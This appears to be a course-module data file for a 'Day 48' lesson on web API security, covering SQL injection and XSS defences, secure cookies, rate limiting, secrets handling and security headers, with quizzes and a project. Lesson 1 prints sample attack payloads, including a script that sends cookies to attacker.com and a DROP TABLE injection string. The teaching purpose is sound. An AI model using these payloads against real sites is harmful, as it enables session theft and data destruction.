@@ -1,0 +1,704 @@
+/**
+ * DAY 48: Phase 1 · Core Python — Enterprise API Security & Threat Defense
+ *
+ * Total Duration: 80 minutes
+ * Difficulty: Advanced
+ * Lessons: 5
+ */
+
+export const phase1ApiSecurity = {
+  day: 48,
+  topic: "Phase 1 · Core Python — Enterprise API Security & Threat Defense",
+  totalMinutes: 80,
+  difficulty: "Advanced",
+  lessons: [
+    {
+      id: "lesson-1",
+      title: "Injection Defense and Input Sanitization: SQLi and XSS",
+      durationMinutes: 18,
+      explanation: `
+<b>Defending Against OWASP Top 10 Injection and Scripting Vulnerabilities</b><br/>
+Securing web APIs requires treating all incoming client data—path parameters, query strings, headers, and JSON request bodies—as inherently untrusted. The two most widespread injection attack vectors targeting web applications are <b>SQL Injection (SQLi)</b> and <b>Cross-Site Scripting (XSS)</b>.<br/><br/>
+
+<b>1. SQL Injection (SQLi):</b><br/>
+Occurs when an attacker injects malicious SQL statements into backend database queries.
+<ul>
+  <li><b>Vulnerability:</b> Concatenating raw user inputs into SQL strings (<code>f"SELECT * FROM users WHERE name = '{input}'"</code>).</li>
+  <li><b>Defense:</b> Always use <b>Parameterized Queries</b> (via <code>psycopg3</code> parameter tuples or SQLAlchemy ORM models). Database drivers compile query structures prior to inserting user data, rendering injected SQL syntax completely inert.</li>
+</ul>
+
+<b>2. Cross-Site Scripting (XSS):</b><br/>
+Occurs when an attacker injects malicious client-side JavaScript code (e.g., <code>&lt;script&gt;stealCookies()&lt;/script&gt;</code>) into API payloads that are later rendered by other users' web browsers.
+<ul>
+  <li><b>Stored XSS:</b> Malicious scripts are saved permanently in a database and served to every user requesting that resource.</li>
+  <li><b>Reflected XSS:</b> Malicious scripts in URL query strings are immediately reflected back in error pages or search results.</li>
+  <li><b>Defense:</b> Enforce strict input validation with Pydantic, escape HTML special characters before rendering, and implement a robust <code>Content-Security-Policy</code> (CSP) header.</li>
+</ul>
+      `,
+      diagram: `
+SQL INJECTION vs XSS ATTACK VECTORS:
+
+  SQL Injection (Targets Backend Database):
+  Client Payload: "TRK-101'; DROP TABLE users; --"
+                        |
+                        v
+  [ Parameterized Query Gate ] ---> Sanitizes payload into literal string data!
+
+  Cross-Site Scripting (XSS) (Targets Other Clients' Browsers):
+  Client Payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
+                        |
+                        v
+  [ Pydantic / HTML Escaper ]  ---> Sanitizes into harmless text: "&lt;script&gt;..."
+      `,
+      codeExample: `
+# ==============================================================================
+# LESSON 1: Input Sanitization and XSS/SQLi Defenses
+# ==============================================================================
+
+import html
+from pydantic import BaseModel, Field, field_validator
+
+# ------------------------------------------------------------------------------
+# Production Pydantic Input Sanitization Model
+# ------------------------------------------------------------------------------
+
+class SecureParcelInputSchema(BaseModel):
+    """Pydantic model defending against XSS script injection and malicious payloads."""
+
+    tracking_id: str = Field(..., pattern=r"^TRK-\d{4}$")
+    recipient_name: str = Field(..., min_length=2, max_length=100)
+    delivery_notes: str | None = Field(default=None, max_length=500)
+
+    @field_validator("recipient_name", "delivery_notes")
+    @classmethod
+    def sanitize_html_xss_payloads(cls, value: str | None) -> str | None:
+        """Sanitizes text fields by escaping HTML special characters (<, >, &, ", ')."""
+        if value is None:
+            return None
+        # Converts <script> into &lt;script&gt; to neutralize XSS execution!
+        clean_text = html.escape(value.strip())
+        return clean_text
+
+print("--- LESSON 1: Input Sanitization Demonstration ---")
+
+# Malicious XSS payload input
+malicious_payload = {
+    "tracking_id": "TRK-9001",
+    "recipient_name": "<script>alert('XSS_ATTACK')</script> Marcus",
+    "delivery_notes": "Leave package at door <img src=x onerror=alert('HACKED')>"
+}
+
+# Validate and sanitize payload
+sanitized_model = SecureParcelInputSchema(**malicious_payload)
+
+print("Original Name Input :", malicious_payload["recipient_name"])
+print("Sanitized Name Output:", sanitized_model.recipient_name)
+print("Sanitized Notes      :", sanitized_model.delivery_notes)
+      `,
+      keyTakeaways: [
+        "Treat all incoming client data as untrusted payload vectors.",
+        "Prevent SQL Injection by using parameterized queries or SQLAlchemy ORM models exclusively.",
+        "Prevent XSS by escaping HTML special characters (`html.escape()`) and validating fields via Pydantic.",
+        "Never concatenate raw user strings into SQL queries or HTML response templates."
+      ],
+      commonMistakes: [
+        "<b>Relying on client-side JavaScript validation alone:</b> Attackers can easily bypass browser checks using `curl` or Postman; validation MUST be enforced on the backend server.",
+        "<b>Attempting custom regex blacklist filtering for XSS:</b> Trying to block specific words like `\"script\"` instead of using standard HTML escaping (`html.escape()`). Attackers easily bypass weak blacklists using encoding tricks."
+      ],
+      quizzes: [
+        {
+          question: "Which python standard library function converts raw HTML characters (`<`, `>`, `&`) into safe escaped entities (`&lt;`, `&gt;`, `&amp;`) to neutralize XSS attacks?",
+          options: [
+            "`html.escape()`",
+            "`string.sanitize()`",
+            "`security.clean_xss()`",
+            "`re.strip_tags()`"
+          ],
+          correctIndex: 0,
+          explanation: "`html.escape()` converts special HTML characters into safe HTML entities, preventing browser script execution."
+        },
+        {
+          question: "Why must input validation and sanitization always be enforced on backend server APIs rather than relying solely on frontend web forms?",
+          options: [
+            "Frontend validation runs too slowly.",
+            "Attackers can easily bypass frontend browser forms by sending raw HTTP requests directly to the API via tools like cURL or Postman.",
+            "Python requires backend validation.",
+            "Frontend code cannot parse strings."
+          ],
+          correctIndex: 1,
+          explanation: "Client-side validation is easily bypassed by sending direct HTTP requests; backend validation is mandatory."
+        }
+      ]
+    },
+    {
+      id: "lesson-2",
+      title: "Cross-Site Defenses: CORS, CSRF, and Secure Cookies",
+      durationMinutes: 20,
+      explanation: `
+<b>Browser Security Boundaries and Credential Isolation</b><br/>
+Web browsers enforce strict security boundaries to isolate websites from one another. Understanding how **CORS**, **CSRF**, and **Secure Cookies** interact is essential for building safe web APIs.<br/><br/>
+
+<b>1. Cross-Origin Resource Sharing (CORS):</b><br/>
+CORS is an HTTP-header-based mechanism that allows a server to indicate which external origin domains (e.g., <code>https://dashboard.company.com</code>) are permitted to read resources.<br/>
+<i>Production Rule:</i> Never use <code>allow_origins=["*"]</code> in production when using authenticated credentials! Explicitly declare allowed domain origins.<br/><br/>
+
+<b>2. Cross-Site Request Forgery (CSRF):</b><br/>
+CSRF occurs when a malicious website causes a victim's web browser to perform an unwanted action on a trusted site where the user is currently authenticated.<br/>
+<i>How it happens:</i> Browsers automatically attach session cookies to outbound HTTP requests matching the target domain. If a user visits \`evil.com\`, a hidden form on \`evil.com\` can submit a \`POST\` request to \`bank.com/transfer\` using the user's active session cookie!<br/><br/>
+
+<b>3. Hardening Cookies with Security Flags:</b><br/>
+When storing authentication tokens in browser cookies, enforce these three mandatory flags:
+<ul>
+  <li><code>HttpOnly</code>: Prevents client-side JavaScript (\`document.cookie\`) from accessing the cookie, neutralizing XSS token theft!</li>
+  <li><code>Secure</code>: Ensures the cookie is transmitted **only** over encrypted HTTPS connections.</li>
+  <li><code>SameSite=Lax</code> (or <code>Strict</code>): Prevents the browser from sending the cookie on cross-site requests, mitigating CSRF attacks!</li>
+</ul>
+      `,
+      diagram: `
+COOKIE SECURITY FLAGS MAPPING:
+
+  Set-Cookie: session_id=xyz123; HttpOnly; Secure; SameSite=Lax; Path=/
+                                 |         |        |
+                                 |         |        +---> Mitigates CSRF (Blocks cross-site sends)
+                                 |         +------------> Enforces HTTPS (Blocks plain HTTP)
+                                 +----------------------> Mitigates XSS (Blocks JS document.cookie)
+      `,
+      codeExample: `
+# ==============================================================================
+# LESSON 2: Secure Cookie Configuration in FastAPI
+# ==============================================================================
+
+from fastapi import FastAPI, Response, status
+
+app = FastAPI()
+
+@app.post("/api/v1/auth/login", status_code=status.HTTP_200_OK)
+async def login_and_set_secure_cookie(response: Response) -> dict[str, str]:
+    """Issues an authentication session token stored in a hardened HTTP cookie."""
+
+    session_token = "MOCK_SECURE_SESSION_JWT_8899"
+
+    # Configure hardened security cookie headers
+    response.set_cookie(
+        key="session_token",
+        value=session_token,
+        httponly=True,           # Prevents JavaScript reading (XSS Defense)
+        secure=True,             # Transmitted ONLY over HTTPS
+        samesite="lax",          # Prevents cross-site submission (CSRF Defense)
+        max_age=3600,            # 1 hour expiration
+        path="/",
+        domain=None
+    )
+
+    return {"message": "Session initialized safely in secure HttpOnly cookie"}
+
+print("--- LESSON 2: Secure Cookie Headers Configured ---")
+print("Cookie Flags: HttpOnly=True, Secure=True, SameSite='lax'")
+      `,
+      keyTakeaways: [
+        "CORS controls which cross-origin domains can read API responses in web browsers.",
+        "CSRF tricks user browsers into sending unwanted requests using active session cookies.",
+        "`HttpOnly` cookies prevent client-side JavaScript access, neutralizing XSS token theft.",
+        "`Secure` cookies enforce HTTPS transmission; `SameSite=Lax/Strict` mitigates CSRF attacks."
+      ],
+      commonMistakes: [
+        "<b>Storing JWT authentication tokens in `localStorage` or `sessionStorage`:</b> Exposing access tokens to instant theft by any XSS script running on the page! Store sensitive tokens in `HttpOnly` cookies instead.",
+        "<b>Setting `SameSite=None` without `Secure`:</b> Browsers reject `SameSite=None` cookies unless the `Secure` flag is enabled."
+      ],
+      quizzes: [
+        {
+          question: "Which cookie security flag prevents client-side JavaScript code (`document.cookie`) from reading an authentication token, neutralizing XSS token theft?",
+          options: [
+            "`Secure`",
+            "`HttpOnly`",
+            "`SameSite`",
+            "`Domain`"
+          ],
+          correctIndex: 1,
+          explanation: "`HttpOnly` blocks JavaScript access to the cookie, ensuring XSS scripts cannot read session tokens."
+        },
+        {
+          question: "How does the `SameSite=Lax` or `SameSite=Strict` cookie attribute help mitigate Cross-Site Request Forgery (CSRF) attacks?",
+          options: [
+            "It encrypts the cookie payload using RSA.",
+            "It instructs web browsers not to send the cookie on cross-site requests originated by third-party websites.",
+            "It speeds up HTTP request execution.",
+            "It converts cookies to JSON objects."
+          ],
+          correctIndex: 1,
+          explanation: "`SameSite` prevents browsers from automatically attaching session cookies when requests originate from third-party cross-site pages."
+        }
+      ]
+    },
+    {
+      id: "lesson-3",
+      title: "Rate Limiting and Denial of Service (DoS) Prevention",
+      durationMinutes: 18,
+      explanation: `
+<b>Protecting API Infrastructure from Abuse and Exhaustion</b><br/>
+Without execution throttling, malicious clients or rogue web scrapers can flood your API with thousands of HTTP requests per second. Unthrottled traffic causes database CPU exhaustion, memory crashes, and service outages for legitimate users (**Denial of Service - DoS**).<br/><br/>
+
+<b>1. Rate Limiting Algorithms:</b>
+<ul>
+  <li><b>Fixed Window Counter:</b> Counts requests in fixed time windows (e.g., max 100 requests per minute). Simple, but vulnerable to traffic spikes at window boundaries.</li>
+  <li><b>Sliding Window Log / Counter:</b> Tracks request timestamps continuously, smoothing out traffic spikes evenly.</li>
+  <li><b>Token Bucket:</b> Tokens are added to a bucket at a constant rate. Requests consume a token. Allows controlled short bursts while enforcing long-term limits.</li>
+</ul>
+
+<b>2. Distributed Rate Limiting with Redis:</b><br/>
+In multi-node production server clusters, in-memory Python counters cannot synchronize state across server instances. Use a centralized <b>Redis</b> cache server to maintain atomic request counters keyed by client IP or authenticated API Key:<br/>
+<code>X-RateLimit-Limit: 100</code><br/>
+<code>X-RateLimit-Remaining: 42</code><br/>
+<code>X-RateLimit-Reset: 1672531200</code><br/><br/>
+
+<b>3. Exceeding Rate Limits (`HTTP 429 Too Many Requests`):</b><br/>
+When a client exceeds their rate limit threshold, the API immediately returns `429 Too Many Requests` with a `Retry-After` header specifying how many seconds to wait!
+      `,
+      diagram: `
+RATE LIMITING TOKEN BUCKET & REDIS STATE:
+
+  Incoming Client Requests (IP: 192.168.1.50)
+                      |
+                      v
+  +--------------------------------------------------------------+
+  |                   Redis Rate Limit Counter                   |
+  |  INCR ratelimit:192.168.1.50 -> Count: 101 / 100 (EXCEEDED!) |
+  +--------------------------------------------------------------+
+                      |
+                      +---> Returns HTTP 429 Too Many Requests!
+                            Header: Retry-After: 30
+      `,
+      codeExample: `
+# ==============================================================================
+# LESSON 3: Rate Limiting & DoS Throttling Implementation
+# ==============================================================================
+
+import time
+from fastapi import FastAPI, Request, HTTPException, status
+
+app = FastAPI()
+
+# ------------------------------------------------------------------------------
+# In-Memory Fixed Window Rate Limiter Class (Production uses Redis)
+# ------------------------------------------------------------------------------
+
+class RateLimiter:
+    """Simple rate limiter enforcing request thresholds per IP address."""
+    def __init__(self, max_requests: int = 5, window_seconds: int = 60):
+        self.max_requests = max_requests
+        self.window_seconds = window_seconds
+        self._client_records: dict[str, list[float]] = {}
+
+    def is_rate_limited(self, client_ip: str) -> tuple[bool, int]:
+        now = time.time()
+        timestamps = self._client_records.get(client_ip, [])
+
+        # Filter timestamps within active window
+        valid_timestamps = [ts for ts in timestamps if now - ts < self.window_seconds]
+        self._client_records[client_ip] = valid_timestamps
+
+        if len(valid_timestamps) >= self.max_requests:
+            return True, 0
+
+        valid_timestamps.append(now)
+        remaining = self.max_requests - len(valid_timestamps)
+        return False, remaining
+
+limiter = RateLimiter(max_requests=3, window_seconds=10)
+
+
+@app.get("/api/v1/throttled-data")
+async def read_throttled_endpoint(request: Request):
+    client_ip = request.client.host if request.client else "127.0.0.1"
+
+    is_limited, remaining = limiter.is_rate_limited(client_ip)
+    if is_limited:
+        raise HTTPException(
+            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
+            detail="Rate limit exceeded. Max 3 requests per 10 seconds.",
+            headers={"Retry-After": "10"}
+        )
+
+    return {"status": "SUCCESS", "client_ip": client_ip, "remaining_quota": remaining}
+
+print("--- LESSON 3: Rate Limiter Configured ---")
+print("Threshold: Max 3 requests per 10 seconds per IP address.")
+      `,
+      keyTakeaways: [
+        "Rate limiting throttles incoming API requests to prevent DoS attacks and server resource exhaustion.",
+        "When rate limits are exceeded, return `HTTP 429 Too Many Requests` with a `Retry-After` header.",
+        "In distributed multi-server environments, use Redis to manage atomic cross-node rate limit counters.",
+        "Include standard headers: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, and `X-RateLimit-Reset`."
+      ],
+      commonMistakes: [
+        "<b>Relying on in-memory dictionary counters across multi-node server clusters:</b> Allowing clients to bypass rate limits by sending requests to different backend server instances.",
+        "<b>Keying rate limits solely by IP address behind load balancers:</b> Throttling all users sharing a corporate NAT proxy IP! Key rate limits by authenticated User ID or API Key whenever possible."
+      ],
+      quizzes: [
+        {
+          question: "Which HTTP status code must an API return when a client exceeds their allocated request rate limit?",
+          options: [
+            "`400 Bad Request`",
+            "`401 Unauthorized`",
+            "`429 Too Many Requests`",
+            "`503 Service Unavailable`"
+          ],
+          correctIndex: 2,
+          explanation: "HTTP 429 Too Many Requests is the standard status code indicating rate limit exhaustion."
+        },
+        {
+          question: "Why is Redis preferred over in-memory Python dictionaries for enforcing rate limits in production deployments?",
+          options: [
+            "Redis encrypts HTTP request headers.",
+            "Redis provides a centralized, high-speed atomic key-value cache shared across all backend server nodes in a cluster.",
+            "Python dictionaries cannot store integers.",
+            "Redis disables CORS."
+          ],
+          correctIndex: 1,
+          explanation: "Redis centralizes request counters across multiple load-balanced server instances using atomic operations."
+        }
+      ]
+    },
+    {
+      id: "lesson-4",
+      title: "Secrets Management and Environment Isolation",
+      durationMinutes: 14,
+      explanation: `
+<b>Protecting Production Keys, Passwords, and Tokens</b><br/>
+A single hardcoded database password or JWT secret key committed to a public Git repository can compromise an entire enterprise infrastructure within minutes. Automated web scrapers continuously scan public repositories for exposed API keys and credentials.<br/><br/>
+
+<b>1. Core Secrets Management Rules:</b>
+<ul>
+  <li><b>Rule 1: Never Hardcode Secrets in Source Code:</b> Always inject credentials at runtime using environment variables.</li>
+  <li><b>Rule 2: Exclude Environment Files from Git:</b> Add <code>.env</code>, <code>*.pem</code>, and <code>secrets.yaml</code> to your <code>.gitignore</code> file unconditionally.</li>
+  <li><b>Rule 3: Rotate Compromised Credentials Immediately:</b> If a secret key is accidentally exposed, invalidate and rotate it instantly!</li>
+</ul>
+
+<b>2. Production Secrets Vaults:</b><br/>
+In enterprise cloud environments (AWS, GCP, Azure), use dedicated secret management vaults:
+<ul>
+  <li><b>AWS Secrets Manager / SSM Parameter Store</b></li>
+  <li><b>HashiCorp Vault</b></li>
+  <li><b>Azure Key Vault / GCP Secret Manager</b></li>
+</ul>
+
+<b>3. Local Development Isolation with \`pydantic-settings\`:</b><br/>
+Use \`pydantic-settings\` to load \`.env\` configuration files during local development while falling back to environment variables in production pipelines.
+      `,
+      diagram: `
+SECRETS MANAGEMENT ISOLATION PIPELINE:
+
+  Development Workstation:        Production Server Cluster:
+  .env File (Local only!)         Cloud Secret Manager (AWS/Vault)
+        |                                       |
+        v                                       v
+  [ Pydantic BaseSettings Model ] <--- Reads Environment Variables
+        |
+        v
+  App Configuration (No raw secrets hardcoded in .py source files!)
+      `,
+      codeExample: `
+# ==============================================================================
+# LESSON 4: Secrets Management & Environment Isolation
+# ==============================================================================
+
+import os
+from pydantic_settings import BaseSettings, SettingsConfigDict
+
+# ------------------------------------------------------------------------------
+# Type-Safe Secrets Model via Pydantic Settings
+# ------------------------------------------------------------------------------
+
+class ProductionSecrets(BaseSettings):
+    """Parses and validates production environment secrets."""
+
+    database_url: str
+    jwt_secret_key: str
+    stripe_api_key: str | None = None
+
+    # Configure pydantic to load from local .env file
+    model_config = SettingsConfigDict(
+        env_file=".env",
+        env_file_encoding="utf-8",
+        extra="ignore"
+    )
+
+
+# Simulated environment variables
+os.environ["DATABASE_URL"] = "postgresql://app_user:SecretPass123@prod-db:5432/logistics"
+os.environ["JWT_SECRET_KEY"] = "CRITICAL_PRODUCTION_JWT_SECRET_990011"
+
+print("--- LESSON 4: Secrets Isolation Test ---")
+
+# Parse secrets from environment
+secrets = ProductionSecrets()
+
+print("Loaded Database DSN :", secrets.database_url.split("@")[-1]) # Hides password
+print("Loaded JWT Secret   :", secrets.jwt_secret_key[:10] + "...")  # Masks secret
+      `,
+      keyTakeaways: [
+        "Never commit secrets, API keys, or database passwords to Git repositories.",
+        "Add `.env` and credential files to `.gitignore` unconditionally.",
+        "Use `pydantic-settings` to parse and validate runtime environment variables safely.",
+        "In production, load secrets from dedicated cloud vaults (AWS Secrets Manager, HashiCorp Vault)."
+      ],
+      commonMistakes: [
+        "<b>Committing `.env` files containing production credentials to Git:</b> Exposing secrets to public or unauthorized team access.",
+        "<b>Printing unmasked secret keys in application log files:</b> Writing `logger.info(f\"Connected with key: {secret_key}\")`, leaking secrets into centralized log aggregators."
+      ],
+      quizzes: [
+        {
+          question: "Which file must ALWAYS be included in your project's `.gitignore` file to prevent committing local environment passwords to version control?",
+          options: [
+            "`pyproject.toml`",
+            "`.env`",
+            "`main.py`",
+            "`requirements.txt`"
+          ],
+          correctIndex: 1,
+          explanation: "The `.env` file contains secret credentials and environment variables; it must never be committed to Git."
+        },
+        {
+          question: "What should you do immediately if a production database password or JWT secret key is accidentally committed to a public Git repository?",
+          options: [
+            "Delete the Git commit history and do nothing else.",
+            "Immediately invalidate and rotate the compromised credential on the production server, then update the secret in your secrets manager.",
+            "Reboot the web server.",
+            "Rename the database table."
+          ],
+          correctIndex: 1,
+          explanation: "Once exposed, a credential must be assumed compromised and rotated immediately on production servers."
+        }
+      ]
+    },
+    {
+      id: "lesson-5",
+      title: "Essential Security Headers and Production Middleware",
+      durationMinutes: 10,
+      explanation: `
+<b>Hardening HTTP Response Headers against Browser Attacks</b><br/>
+Even with strong authentication and input validation, unhardened HTTP response headers leave web applications vulnerable to clickjacking, MIME-type sniffing, and cross-site scripting.<br/><br/>
+
+<b>1. Mandatory Production Security Headers:</b>
+<ul>
+  <li><b>Strict-Transport-Security (HSTS):</b> Forces browsers to communicate with the server **exclusively** over encrypted HTTPS connections, blocking SSL-stripping attacks.
+    <br/><code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></li>
+  <li><b>Content-Security-Policy (CSP):</b> Restricts the origins from which scripts, images, and stylesheets can be loaded, neutralizing XSS attacks.
+    <br/><code>Content-Security-Policy: default-src 'self'</code></li>
+  <li><b>X-Frame-Options:</b> Prevents the page from being embedded in <code>&lt;iframe&gt;</code> tags on third-party sites, mitigating <b>Clickjacking</b> attacks!
+    <br/><code>X-Frame-Options: DENY</code> (or <code>SAMEORIGIN</code>)</li>
+  <li><b>X-Content-Type-Options:</b> Prevents browsers from MIME-sniffing response bodies away from the declared <code>Content-Type</code>.
+    <br/><code>X-Content-Type-Options: nosniff</code></li>
+</ul>
+
+<b>2. Adding Security Headers via FastAPI Middleware:</b><br/>
+You can attach security headers to every outgoing HTTP response automatically using custom middleware!
+      `,
+      diagram: `
+PRODUCTION SECURITY HEADERS LAYER:
+
+  Outgoing HTTP Response Message
+               |
+               v  Custom Security Middleware
+  +--------------------------------------------------------------+
+  |  Strict-Transport-Security : max-age=31536000                |
+  |  Content-Security-Policy   : default-src 'self'              |
+  |  X-Frame-Options           : DENY                            |
+  |  X-Content-Type-Options    : nosniff                         |
+  +--------------------------------------------------------------+
+               |
+               v
+  Client Web Browser Enforces Security Restrictions!
+      `,
+      codeExample: `
+# ==============================================================================
+# LESSON 5: Security Headers Middleware Implementation
+# ==============================================================================
+
+from fastapi import FastAPI, Request
+
+app = FastAPI()
+
+# ------------------------------------------------------------------------------
+# Custom Security Headers Middleware
+# ------------------------------------------------------------------------------
+
+@app.middleware("http")
+async def add_security_headers_middleware(request: Request, call_next):
+    """Middleware attaching mandatory production security headers to all HTTP responses."""
+    response = await call_next(request)
+
+    # 1. Enforce HTTPS only (HSTS)
+    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
+    # 2. Block Clickjacking (X-Frame-Options)
+    response.headers["X-Frame-Options"] = "DENY"
+    # 3. Block MIME-type sniffing
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    # 4. Restrict script loading origins (CSP)
+    response.headers["Content-Security-Policy"] = "default-src 'self'"
+    # 5. Disable referrer leakage
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+
+    return response
+
+
+@app.get("/api/v1/secure-content")
+async def read_secure_content():
+    return {"status": "SUCCESS", "message": "Response protected by security headers"}
+
+print("--- LESSON 5: Security Headers Middleware Attached ---")
+print("Headers: HSTS, X-Frame-Options=DENY, X-Content-Type-Options=nosniff, CSP")
+      `,
+      keyTakeaways: [
+        "Attach production security headers to every HTTP response using custom middleware.",
+        "HSTS (`Strict-Transport-Security`) enforces encrypted HTTPS connections exclusively.",
+        "`X-Frame-Options: DENY` prevents Clickjacking attacks via hidden `<iframe>` tags.",
+        "`X-Content-Type-Options: nosniff` prevents browser MIME-type sniffing.",
+        "Content Security Policy (`CSP`) restricts script execution origins to combat XSS."
+      ],
+      commonMistakes: [
+        "<b>Forgetting HSTS headers on HTTPS APIs:</b> Allowing attackers to downgrade user connections to unencrypted HTTP via SSL-stripping attacks.",
+        "<b>Omitting `X-Frame-Options`:</b> Allowing malicious websites to overlay your web application inside a transparent `<iframe>` to steal clicks (Clickjacking)."
+      ],
+      quizzes: [
+        {
+          question: "Which HTTP security header prevents third-party websites from embedding your web application inside a transparent `<iframe>` to commit Clickjacking attacks?",
+          options: [
+            "`Strict-Transport-Security`",
+            "`X-Frame-Options: DENY`",
+            "`X-Content-Type-Options: nosniff`",
+            "`Access-Control-Allow-Origin`"
+          ],
+          correctIndex: 1,
+          explanation: "`X-Frame-Options: DENY` instructs browsers to block framing, mitigating Clickjacking attacks."
+        },
+        {
+          question: "What is the primary security function of the `Strict-Transport-Security` (HSTS) header?",
+          options: [
+            "It forces web browsers to communicate with the server EXCLUSIVELY over encrypted HTTPS connections for a specified time duration.",
+            "It disables API key authentication.",
+            "It compresses JSON response payloads.",
+            "It clears browser cookies on logout."
+          ],
+          correctIndex: 0,
+          explanation: "HSTS instructs browsers to enforce encrypted HTTPS connections exclusively, preventing HTTP downgrade attacks."
+        }
+      ]
+    }
+  ],
+  finalQuiz: [
+    {
+      question: "Which Python function converts special HTML characters (`<`, `>`, `&`) into escaped entities (`&lt;`, `&gt;`) to sanitize inputs against XSS attacks?",
+      options: [
+        "`html.escape()`",
+        "`string.clean()`",
+        "`security.sanitize()`",
+        "`re.strip_html()`"
+      ],
+      correctIndex: 0,
+      explanation: "`html.escape()` converts special HTML characters into safe escaped entities."
+    },
+    {
+      question: "Which cookie flag prevents client-side JavaScript (`document.cookie`) from accessing session tokens, neutralizing XSS token theft?",
+      options: [
+        "`Secure`",
+        "`HttpOnly`",
+        "`SameSite`",
+        "`Domain`"
+      ],
+      correctIndex: 1,
+      explanation: "`HttpOnly` blocks JavaScript access to cookies, neutralizing XSS token theft."
+    },
+    {
+      question: "What HTTP status code must an API return when a client exceeds their rate limiting quota?",
+      options: [
+        "`400 Bad Request`",
+        "`401 Unauthorized`",
+        "`429 Too Many Requests`",
+        "`500 Internal Server Error`"
+      ],
+      correctIndex: 2,
+      explanation: "HTTP 429 Too Many Requests indicates rate limit threshold exhaustion."
+    },
+    {
+      question: "Why are fast hashing algorithms like MD5 or SHA-256 unsafe for storing user passwords?",
+      options: [
+        "They are limited to 5-character strings.",
+        "Modern GPUs can compute billions of fast SHA-256 hashes per second, making offline brute-force attacks extremely fast.",
+        "They only run on Linux.",
+        "They delete passwords."
+      ],
+      correctIndex: 1,
+      explanation: "Fast hash functions allow modern GPUs to execute fast offline brute-force attacks."
+    },
+    {
+      question: "Which HTTP header prevents browsers from MIME-sniffing response bodies away from the declared Content-Type?",
+      options: [
+        "`X-Frame-Options`",
+        "`X-Content-Type-Options: nosniff`",
+        "`Strict-Transport-Security`",
+        "`Content-Security-Policy`"
+      ],
+      correctIndex: 1,
+      explanation: "`X-Content-Type-Options: nosniff` prevents browser MIME-type sniffing."
+    },
+    {
+      question: "Which cookie attribute prevents browsers from sending cookies on cross-site requests originated by third-party sites, mitigating CSRF?",
+      options: [
+        "`SameSite=Lax` or `SameSite=Strict`",
+        "`HttpOnly`",
+        "`Secure`",
+        "`Path=/`"
+      ],
+      correctIndex: 0,
+      explanation: "`SameSite` prevents cookies from being attached automatically on cross-site requests."
+    },
+    {
+      question: "Where should centralized, distributed rate limiting counters be stored in multi-node server clusters?",
+      options: [
+        "In-memory Python dictionaries on each node",
+        "A centralized, high-speed Redis key-value cache server",
+        "In text files on disk",
+        "In local browser storage"
+      ],
+      correctIndex: 1,
+      explanation: "Redis centralizes request counters across multiple load-balanced server nodes."
+    },
+    {
+      question: "Which header forces web browsers to communicate with the server EXCLUSIVELY over encrypted HTTPS connections?",
+      options: [
+        "`Content-Security-Policy`",
+        "`Strict-Transport-Security` (HSTS)",
+        "`X-Frame-Options`",
+        "`Access-Control-Allow-Origin`"
+      ],
+      correctIndex: 1,
+      explanation: "HSTS forces browsers to enforce encrypted HTTPS connections exclusively."
+    }
+  ],
+  project: {
+    name: "Enterprise Hardened API Security Suite (Phase 1 Final Project)",
+    goal: "Build a production-grade API security suite featuring XSS input sanitization via Pydantic, hardened HttpOnly/Secure/SameSite cookie issuing, IP rate limiting throttling (HTTP 429), type-safe secrets loading, and custom security headers middleware.",
+    brief: "Your enterprise platform requires a comprehensive API security suite (`hardened_security_suite.py`). The application must sanitize incoming payloads against XSS (`html.escape`), set hardened session cookies (`HttpOnly`, `Secure`, `SameSite=Lax`), enforce IP rate limiting thresholds, parse secrets via `pydantic-settings`, and attach mandatory security headers (`HSTS`, `X-Frame-Options`, `X-Content-Type-Options`, `CSP`) via custom FastAPI middleware.",
+    steps: [
+      "Create a workspace script file named `hardened_security_suite.py`.",
+      "Implement a Pydantic schema `SanitizedInputSchema` with `@field_validator` applying `html.escape` to neutralize XSS.",
+      "Implement an in-memory `RateLimiter` class returning `HTTP 429 Too Many Requests` when limits are exceeded.",
+      "Build a login route setting hardened session cookies (`httponly=True`, `secure=True`, `samesite=\"lax\"`).",
+      "Attach custom security middleware adding `Strict-Transport-Security`, `X-Frame-Options=DENY`, `X-Content-Type-Options=nosniff`, and `Content-Security-Policy` headers.",
+      "Simulate API requests testing input sanitization, rate limit throttling, and security header inspection.",
+      "Run `python3 hardened_security_suite.py` in your terminal and print a complete security audit report."
+    ],
+    acceptance: [
+      "Input payloads are escaped using `html.escape()` against XSS.",
+      "Session cookies enforce `HttpOnly`, `Secure`, and `SameSite=Lax` flags.",
+      "Rate limit exhaustion returns `HTTP 429 Too Many Requests`.",
+      "Middleware attaches HSTS, X-Frame-Options, X-Content-Type-Options, and CSP headers.",
+      "Executing `python3 hardened_security_suite.py` outputs a clean security execution report and returns status exit code 0."
+    ],
+    stretch: [
+      "Connect the rate limiter to a local or mocked Redis instance using `redis-py`.",
+      "Annotate all security functions with strict type hints and pass static `mypy` verification."
+    ]
+  }
+};
